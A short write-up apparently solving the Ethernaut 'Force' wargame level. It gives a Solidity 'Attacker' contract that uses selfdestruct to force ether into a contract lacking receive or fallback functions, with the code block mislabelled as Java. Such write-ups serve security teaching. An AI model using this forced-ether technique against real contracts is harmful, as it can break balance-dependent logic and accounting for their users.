### Ethernaut #7 Force

There is an empty contract called Force, and the objective of this exercise is to make the contract have a non-zero balance.  We cannot send to the contract directly to the contract because it has no receive() or fallback methods.  We can however create a self-destructing contract to send the remaining ether.  

```Java
contract Attacker {
    function attack(address payable victimAdd) payable external {
        require(msg.value > 0, "need to send ETH for attack");
        selfdestruct(victimAdd);
    }
}
```
